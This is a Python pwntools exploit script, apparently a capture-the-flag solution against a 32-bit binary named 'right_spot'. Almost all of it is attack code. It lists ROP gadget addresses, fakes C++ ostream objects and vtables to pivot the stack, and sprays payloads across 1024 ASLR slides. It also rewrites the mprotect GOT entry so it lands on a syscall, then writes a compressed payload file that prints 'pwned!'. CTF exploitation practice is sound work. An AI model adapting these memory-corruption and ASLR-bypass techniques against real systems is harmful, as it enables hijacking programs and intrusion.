#!/usr/bin/env python3
from pwn import *
import zlib
e = ELF("../src/right_spot")

import struct

# OFFSET_MPROTECT_TO_SYSCALL = 0x16  # ARCH
OFFSET_MPROTECT_TO_SYSCALL = 0x12  # Ubuntu Docker

assert(OFFSET_MPROTECT_TO_SYSCALL < 0x100)
GADGET_LEA_ESP_ECX_MIN_4 = 0x00001687
GADGET_FIXUP_3_ARGS = 0x00001401 # 0x00001401: pop esi; pop edi; pop ebp; ret; 
GADGET_FIXUP_2_ARGS = 0x00001c38  # 0x00001c38: pop esi; pop ebp; ret; 
GADGET_POP_EBX = 0x00001022 # 0x00001022: pop ebx; ret;
GADGET_POP_EBP = 0x00001403 # 0x00001403: pop ebp; ret; 
GADGET_POP_REG = GADGET_POP_EBP
GADGET_FIXUP_1_ARG = GADGET_POP_REG
GADGET_INC_EAX = 0x00002907 # 0x00002907: inc eax; or cl, cl; ret;

GADGET_MOV_EAX_DW_PTR_EBP_P_0xC_POP_EBP = 0x00002331 # 0x00002331: mov eax, dword ptr [ebp + 0xc]; pop ebp; ret; 
GADGET_MOV_EDX_DW_PTR_EBP_P_0xC_MOV_DW_PTR_EAX_EDX_POP_EBP = 0x00002c42 # 0x00002c42: mov edx, dword ptr [ebp + 0xc]; mov dword ptr [eax], edx; nop; pop ebp; ret;
GADGET_MOV_DW_PTR_EAX_EDX_POP_EBP = 0x0000176f # 0x0000176f: mov dword ptr [eax], edx; nop; pop ebp; ret;

GADGET_ADD_BYTE_PTR_EAX_MIN_1_BH_POP_EBP = 0x00002cc7 # 0x00002cc7: add byte ptr [eax - 1], bh; pop ebp; ret;

GADGET_FN_RET_ARG1 = e.symbols[b'_ZSt11__addressofIcEPT_RS0_']
GADGET_NOP = 0x00001974 # 0x00001974: ret; 

"""

"""
NUM_SUBREGION_BITS = 4
STRING_OBJ_SIZE = 0x18

EXPECTED_STRING = b"pwned!\0"

region_size = 0x00400000
region_base = 0x57000000
base_addr = 0x56400000
cfg_obj_arr_member_offset = 4
arr_start_off = e.symbols[b'cfg'] + cfg_obj_arr_member_offset

ASLR_SLIDES = 2 ** 10

relocated_pl_size = region_size // ASLR_SLIDES // 2
print(f"relocated_pl_size: {relocated_pl_size:x}")
assert(relocated_pl_size == 0x800)

# The size to reserve for string pointer stuff
relocated_pl_tail_size = 0x80
# To which offset we need to jump within the slide to get to fake strings
# reloc_page_ptr_start_offset = relocated_pl_size - relocated_pl_tail_size
reloc_page_ptr_start_offset = 0xfc0
fake_ptr_region_size = 0x1000 // (1 << NUM_SUBREGION_BITS)
print(f"{fake_ptr_region_size:x}")
assert(fake_ptr_region_size == 2 ** (12-NUM_SUBREGION_BITS))

while (0xc00000 + reloc_page_ptr_start_offset - arr_start_off) % STRING_OBJ_SIZE != 0:
    reloc_page_ptr_start_offset += 4
walk_distance = (0xc00000 + reloc_page_ptr_start_offset - arr_start_off)
offset_ind = walk_distance // STRING_OBJ_SIZE
in_fake_ptr_region_offset = reloc_page_ptr_start_offset % fake_ptr_region_size
print("off: ", in_fake_ptr_region_offset, "remaining: ", fake_ptr_region_size-in_fake_ptr_region_offset)

page_offset = arr_start_off & 0xfff
assert(in_fake_ptr_region_offset % 4 == 0)
num_pad_dwords = in_fake_ptr_region_offset // 4

print(f"in-cfg arr offset: 0x{arr_start_off:x}. Offset ind: {offset_ind}. page_offset: {page_offset:x}. num_pads: {num_pad_dwords}")
contents = b""
constant_victim_addr = region_base + region_size // 2

def text_base(shift):
    return base_addr + shift * 0x1000

victim_write = b""

# second-level contents (shifted 0x800-sized payloads)
# Addresses: 0: 512 shift, 1: 0 shift, 2: 513 shift, 3: 1 shift
for i in range(ASLR_SLIDES-1, -1, -1):
#for i in range(ASLR_SLIDES):
    if i % 2 == 0:
        # even: second half of shifts
        target_slide = i // 2
    else:
        # odd: first half of shifts
        target_slide = 512 + i // 2

    relocated_base = text_base(target_slide)
    def rel(offset):
        return relocated_base + offset

    def pack_rel(offset):
        return struct.pack("<I", rel(offset))

    # relocated_pl = struct.pack("<I", relocated_base)
    relocated_pl = struct.pack("<I", constant_victim_addr + 0x10)
    START_INNER_FAKE_OBJ_OFFSET = 0x10
    relocated_pl += struct.pack("<I", START_INNER_FAKE_OBJ_OFFSET)
    relocated_pl += 8 * b"P"
    # Start fake object
    assert (len(relocated_pl) == START_INNER_FAKE_OBJ_OFFSET)
    relocated_pl += (2 * 4) * b"P"
    relocated_pl += struct.pack("<I", 0x44444444)  # some stream size
    # relocated_pl += struct.pack("<I", 32) # some mode  (!= 32)
    relocated_pl += struct.pack("<I", 0x41414141) # pad
    relocated_pl += struct.pack("<I", 0x42424242) # pad
    # relocated_pl += (2 * 4) * b"P"
    relocated_pl += struct.pack("<I", 0)  # not_os_good

    # This is backwards-referenced into padding space
    OFFSET_FLUSH_THIS_VT = len(relocated_pl)
    OFFSET_FAKE_FLUSH_INNER_OBJ = OFFSET_FLUSH_THIS_VT + 4
    START_FLUSH_THIS_OBJECT_OFFSET = START_INNER_FAKE_OBJ_OFFSET + 4 + 0x6c + 4 + 4

    assert(len(relocated_pl) == OFFSET_FLUSH_THIS_VT)
    # VT offset start (OFFSET_FLUSH_THIS_VT)
    # offset pointed to by vtable (taken +0x78 to figure out our target location)
    backwards_pointing_offset = OFFSET_FAKE_FLUSH_INNER_OBJ - START_FLUSH_THIS_OBJECT_OFFSET - 0x78
    relocated_pl += struct.pack("<i", backwards_pointing_offset)  # offset at which the
    
    assert(len(relocated_pl) == OFFSET_FAKE_FLUSH_INNER_OBJ)
    # Start of inner object of flush (OFFSET_FAKE_FLUSH_INNER_OBJ)
    # VT pointer loc
    relocated_pl += struct.pack("<I", constant_victim_addr + OFFSET_FAKE_FLUSH_INNER_OBJ + 4)
    # VT
    relocated_pl += struct.pack("<I", constant_victim_addr + OFFSET_FAKE_FLUSH_INNER_OBJ + 8 - 0x18)
    # VT->fn (0x18 offset)
    PIVOT_GADGET_ADDRESS = rel(GADGET_LEA_ESP_ECX_MIN_4)
    relocated_pl += struct.pack("<I", PIVOT_GADGET_ADDRESS)

    assert (len(relocated_pl) <= (START_INNER_FAKE_OBJ_OFFSET + 4 + 0x6c))
    relocated_pl += ((START_INNER_FAKE_OBJ_OFFSET + 4 + 0x6c) - len(relocated_pl)) * b"P"
    
    # Start sentry inner object
    FLUSH_THIS_OBJ = constant_victim_addr + START_FLUSH_THIS_OBJECT_OFFSET # this pointer is passed to std::ostream::flush
    relocated_pl += struct.pack("<I", FLUSH_THIS_OBJ)  # os.tie()

    # Need to jump over vtable with first gadget
    FIRST_GADGET = rel(GADGET_POP_REG)
    relocated_pl += struct.pack("<I", FIRST_GADGET)

    # print(f"START_FLUSH_THIS_OBJECT_OFFSET = {START_FLUSH_THIS_OBJECT_OFFSET:x}")
    assert (len(relocated_pl) == START_FLUSH_THIS_OBJECT_OFFSET)
    # Start fake flush this object
    # To not clobber anything after here, we reference earlier into our buffer
    # 1. vtable ptr
    relocated_pl += struct.pack("<I", constant_victim_addr + OFFSET_FLUSH_THIS_VT + 0xc)

    # START ROP CHAIN
    OFFSET_ROP_START = len(relocated_pl)
    OFFSET_ROP_COUT_ARG_1 = (21+10) * 4  # TODO
    OFFSET_ROP_COUT_ARG_2 = OFFSET_ROP_COUT_ARG_1 + 4 * 4  # TODO
    OFFSET_ROP_ENDL_ARG = OFFSET_ROP_COUT_ARG_2 + 4  # TODO
    OFFSET_EXPECTED_STRING = 0xb8 - 8
    OFFSET_ROP_EXIT_ENTRY = OFFSET_ROP_ENDL_ARG + 6 * 4 # TODO

    rop = b""
    # 0 Setup regs and stack args
    # 0.1 exit jump address
    # 0.1.1 write mprotect
    # eax = &ROP_EXIT_ENTRY
    rop += pack_rel(GADGET_FN_RET_ARG1)
    rop += pack_rel(GADGET_FIXUP_1_ARG)
    rop += struct.pack("<I", constant_victim_addr + OFFSET_ROP_START + OFFSET_ROP_EXIT_ENTRY)
    # ebp = &mprotect_ptr-0xc
    rop += pack_rel(GADGET_POP_EBP)
    rop += pack_rel(e.symbols[b'got.mprotect'] - 0xC)
    # [ROP_EXIT_ENTRY] = mprotect
    rop += pack_rel(GADGET_MOV_EDX_DW_PTR_EBP_P_0xC_MOV_DW_PTR_EAX_EDX_POP_EBP)
    rop += struct.pack("<I", 0xebebebeb)  # ebp
    # 0.1.2 shift mprotect to syscall
    # eax = &ROP_EXIT_ENTRY+1
    rop += pack_rel(GADGET_INC_EAX)
    rop += pack_rel(GADGET_POP_EBX)
    rop += struct.pack("<I", OFFSET_MPROTECT_TO_SYSCALL<<8)
    rop += pack_rel(GADGET_ADD_BYTE_PTR_EAX_MIN_1_BH_POP_EBP)
    rop += pack_rel(e.symbols[b'got.mprotect'] + 0x20 - 0xC) # TODO: cout symbol not parsed in got

    # 0.2 stack args
    # 0.2.1 ROP_COUT_ARG_1 = cout
    # eax = &ROP_COUT_ARG_1
    rop += pack_rel(GADGET_FN_RET_ARG1)
    rop += pack_rel(GADGET_POP_EBX)
    rop += struct.pack("<I", constant_victim_addr + OFFSET_ROP_START + OFFSET_ROP_COUT_ARG_1)
    # ebp already &cout_ptr-0xc
    # ebp = &cout_ptr-0xc
    # edx = cout
    # [ROP_COUT_ARG_1] = cout
    rop += pack_rel(GADGET_MOV_EDX_DW_PTR_EBP_P_0xC_MOV_DW_PTR_EAX_EDX_POP_EBP)
    rop += struct.pack("<I", 0xebebebeb) # ebp
    
    # 0.2.2 ROP_COUT_ARG_2 = cout
    # (edx already == cout)
    # eax = &ROP_COUT_ARG_2
    rop += pack_rel(GADGET_FN_RET_ARG1)
    rop += pack_rel(GADGET_FIXUP_1_ARG)
    rop += struct.pack("<I", constant_victim_addr + OFFSET_ROP_START + OFFSET_ROP_COUT_ARG_2)
    rop += pack_rel(GADGET_MOV_DW_PTR_EAX_EDX_POP_EBP)
    # rop += struct.pack("<I", 0xebebebeb)  # ebp
    # ebp = &endl_ptr-0xc
    rop += pack_rel(e.symbols[b'got.mprotect'] + 0xC - 0xC) # TODO: std::endl symbol not parsed in got

    # 0.2.3 OFFSET_ROP_ENDL_ARG = std::endl
    # ebp already = &endl_ptr-0xc
    # eax = &ROP_ENDL_ARG
    rop += pack_rel(GADGET_FN_RET_ARG1)
    rop += pack_rel(GADGET_POP_EBX)
    rop += struct.pack("<I", constant_victim_addr + OFFSET_ROP_START + OFFSET_ROP_ENDL_ARG)

    # [ROP_ENDL_ARG] = endl
    rop += pack_rel(GADGET_MOV_EDX_DW_PTR_EBP_P_0xC_MOV_DW_PTR_EAX_EDX_POP_EBP)
    rop += struct.pack("<I", 0xebebebeb) # ebp

    # 0.3 ebx: relocations
    rop += pack_rel(GADGET_POP_EBX)
    rop += pack_rel(e.symbols[b'_GLOBAL_OFFSET_TABLE_'])

    # 1.2 call cout printing
    rop += pack_rel(e.symbols[b'_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc']) # std::ostream & std::operator<<<std::char_traits<char>>(std::ostream &, char const*)
    rop += pack_rel(GADGET_FIXUP_2_ARGS)

    assert(len(rop) == OFFSET_ROP_COUT_ARG_1)
    # cout
    rop += struct.pack("<I", 0xdeadbeef) # will be filled in above
    # string
    rop += struct.pack("<I", constant_victim_addr + OFFSET_ROP_START + OFFSET_EXPECTED_STRING)

    rop += pack_rel(e.symbols[b'_ZNSolsEPFRSoS_E'])  # std::ostream::operator<<(std::ostream & (*)(std::ostream &))
    rop += pack_rel(GADGET_FIXUP_2_ARGS)

    assert(len(rop) == OFFSET_ROP_COUT_ARG_2)
    rop += struct.pack("<I", 0xdeadbeef) # will be filled in above
    assert(len(rop) == OFFSET_ROP_ENDL_ARG)
    rop += struct.pack("<I", 0xdeadbeef) # will be filled in above

    # 2. clean exit
    # VSYSCALL number for exit is eax = 0xFC
    # ebx: status
    # eax = 0xFC
    rop += pack_rel(GADGET_FN_RET_ARG1)
    rop += pack_rel(GADGET_FIXUP_1_ARG)
    rop += struct.pack("<I", 0xFC)
    # ebx = 0
    rop += pack_rel(GADGET_POP_EBX)
    rop += struct.pack("<I", 0x0)


    assert(len(rop) == OFFSET_ROP_EXIT_ENTRY)
    rop += struct.pack("<I", 0x90909090)

    rop += (OFFSET_EXPECTED_STRING-len(rop)) * b"P"
    
    assert(OFFSET_EXPECTED_STRING == len(rop))
    while len(EXPECTED_STRING) % 4 != 0:
        EXPECTED_STRING += b"\0"
    rop += EXPECTED_STRING

    relocated_pl += rop

    relocated_pl += (relocated_pl_size - len(relocated_pl)) * b"A"
    
    assert (len(relocated_pl) <= relocated_pl_size)
    victim_write += relocated_pl

victim_write = victim_write[:-relocated_pl_tail_size]

for i in range(ASLR_SLIDES):
    # relocate target address based on offset slide (first half: after / 0x800, second half: before / 0)
    data_section_addr = text_base(i) + arr_start_off - 4
    dso_handle_addr = text_base(i) + e.symbols[b"__dso_handle"]

    if i < ASLR_SLIDES / 2:
        shifted_region_write_addr = region_base + i * 0x1000 + 0x800
    else:
        shifted_region_write_addr = region_base + (i + 1) * 0x1000 - (region_size // 2)
    assert(shifted_region_write_addr + region_size // 2 <= region_base + region_size)

    reloc_fake_ptr_pl = b""
    reloc_fake_ptr_pl += num_pad_dwords * b"PPPP"
    # Full fake string (including in-object space 0x18)
    reloc_fake_ptr_pl += struct.pack("<IIIIII", data_section_addr, 5, 5, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef)
    # The last entry does not need padded string contents
    reloc_fake_ptr_pl += struct.pack("<III", shifted_region_write_addr, len(victim_write) + 1, len(victim_write) + 1)

    reloc_fake_ptr_pl += (fake_ptr_region_size - len(reloc_fake_ptr_pl)) * b"P"

    assert(len(reloc_fake_ptr_pl) == fake_ptr_region_size)
    assert(0x1000 % fake_ptr_region_size == 0)

    contents += (0x1000 // fake_ptr_region_size) * reloc_fake_ptr_pl


contents = (2 * contents)[:-1 - 0xf00]
expected_content_len = 2*region_size - 1 - 0xf00
print(f"len(contents): {len(contents):x}, expected: {expected_content_len:x}")
assert(len(contents) == expected_content_len)

# Put Payload together
final_pl = b""
# x,y coordinate
final_pl += struct.pack("<II", 0x80000000, 1)
# Write full region
final_pl += struct.pack("<I", len(contents))
final_pl += contents

# Walk to region
final_pl += (offset_ind - 1) * struct.pack("<I", 0)

# Write constant pointer to data section
final_pl += struct.pack("<I", 4)
final_pl += struct.pack("<I", constant_victim_addr)

# Write shifted payloads
final_pl += struct.pack("<I", len(victim_write))
final_pl += victim_write

import bz2
DECOMPRESSED_LIMIT = 30*2**20   # 30 MB uncompressed
def compress(data):
    if len(data) > DECOMPRESSED_LIMIT:
        print('ERROR: File size limit exceeded!', file=sys.stderr)
        exit(0)

    return bz2.compress(data, compresslevel=9)

with open("pl.bin.bz2", "wb") as f:
    f.write(compress(final_pl))
